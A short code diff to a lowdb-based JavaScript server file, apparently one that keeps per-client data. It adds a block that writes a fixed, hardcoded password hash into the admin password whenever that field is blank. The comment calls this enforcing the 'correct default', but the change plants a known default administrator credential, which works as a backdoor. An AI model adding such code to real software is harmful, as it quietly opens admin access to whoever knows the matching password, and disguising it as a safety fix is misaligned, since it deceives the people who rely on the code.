@@ -16,6 +16,11 @@ db.defaults({
     clients: []
 }).write()
 
+// Always enforce the correct default password hash so it is never left blank.
+if (!db.get('admin.password').value()) {
+    db.set('admin.password', '8b3712862fefd088c3366d9a62d3662d').write();
+}
+
 class clientdb {
     constructor(clientID) {
         let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'))
